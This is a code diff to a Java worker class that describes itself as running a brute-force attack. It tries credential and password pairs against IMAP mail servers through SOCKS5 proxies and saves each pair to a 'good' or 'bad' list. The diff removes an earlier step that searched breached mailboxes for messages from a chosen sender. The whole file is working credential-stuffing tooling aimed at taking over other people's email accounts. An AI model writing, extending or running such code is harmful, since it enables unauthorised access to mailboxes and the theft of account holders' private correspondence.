@@ -1,8 +1,6 @@
 package org.bsoftware.parcel.domain.runnables;
 
 import com.chilkatsoft.CkImap;
-import com.chilkatsoft.CkMailboxes;
-import com.chilkatsoft.CkMessageSet;
 import com.chilkatsoft.CkString;
 import lombok.RequiredArgsConstructor;
 import lombok.SneakyThrows;
@@ -17,41 +15,30 @@ import org.bsoftware.parcel.utilities.ConnectionUtility;
 import org.bsoftware.parcel.utilities.FileSystemUtility;
 
 import java.io.IOException;
-import java.util.Optional;
 
 /**
  * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
  *
  * @author Rudolf Barbu
- * @version 1.0.9
+ * @version 1.0.10
  */
 @RequiredArgsConstructor
 public class BruteForceRunnable implements Runnable
 {
     /**
-     * Defines connection timeout
+     * Defines proxy socks version
      */
-    private static final byte CONNECTION_TIMEOUT = 5;
+    private static final int PROXY_VERSION = 5;
 
     /**
-     * Defines Socks version
+     * Defines proxy connection timeout
      */
-    private static final byte SOCKS_VERSION = 5;
+    private static final int PROXY_CONNECTION_TIMEOUT = 5;
 
     /**
      * Defines error pattern, that indicate connection impossibility
      */
     private static final String NO_CONNECTION_TO_IMAP_SERVER_ERROR = "<error>No connection to IMAP server.</error>";
-
-    /**
-     * Defines, if search algorithm is in use
-     */
-    private static final Boolean SEARCH_LETTERS = Boolean.FALSE;
-
-    /**
-     * Defines search query
-     */
-    private static final String SEARCH_QUERY = "";
 
     /**
      * Callback interface, which is used to deliver messages to service
@@ -67,8 +54,8 @@ public class BruteForceRunnable implements Runnable
     {
         final CkImap ckImap = new CkImap();
 
-        ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
-        ckImap.put_SocksVersion(SOCKS_VERSION);
+        ckImap.put_SocksVersion(PROXY_VERSION);
+        ckImap.put_ConnectTimeout(PROXY_CONNECTION_TIMEOUT);
 
         try
         {
@@ -86,7 +73,7 @@ public class BruteForceRunnable implements Runnable
 
                 if (retrieveStatus == Status.GOOD)
                 {
-                    FileSystemUtility.saveSourceToFile(executeBruteForceActions(ckImap, source).name().toLowerCase(), source);
+                    FileSystemUtility.saveSourceToFile(ckImap.Login(source.getCredential(), source.getPassword()) ? Status.GOOD.name().toLowerCase() : Status.BAD.name().toLowerCase(), source);
                     ckImap.Disconnect();
                 }
                 else
@@ -171,41 +158,10 @@ public class BruteForceRunnable implements Runnable
     }
 
     /**
-     * Executing brute-force actions, such as log into account and search for letters
-     *
-     * @param ckImap IMAP to execute actions
-     * @param source source object, which is supplied to perform actions
-     */
-    private Status executeBruteForceActions(final CkImap ckImap, final Source source)
-    {
-        if (!ckImap.Login(source.getCredential(), source.getPassword()))
-        {
-            return Status.BAD;
-        }
-
-        if (Boolean.TRUE.equals(SEARCH_LETTERS))
-        {
-            final CkMailboxes ckMailboxes = ckImap.ListMailboxes("", "*");
-            for (int index = 0; index < ckMailboxes.get_Count(); index++)
-            {
-                ckImap.SelectMailbox(ckMailboxes.getName(index));
-
-                final Optional<CkMessageSet> ckMessageSetOptional = Optional.ofNullable(ckImap.Search(String.format("FROM %s", SEARCH_QUERY), Boolean.TRUE));
-                if (ckMessageSetOptional.isPresent() && (ckMessageSetOptional.get().get_Count() > 0))
-                {
-                    return Status.FOUND;
-                }
-            }
-        }
-
-        return Status.GOOD;
-    }
-
-    /**
      * Enum with all possible statuses
      */
     private enum Status
     {
-        ERROR, BAD, GOOD, FOUND
+        ERROR, BAD, GOOD
     }
 }
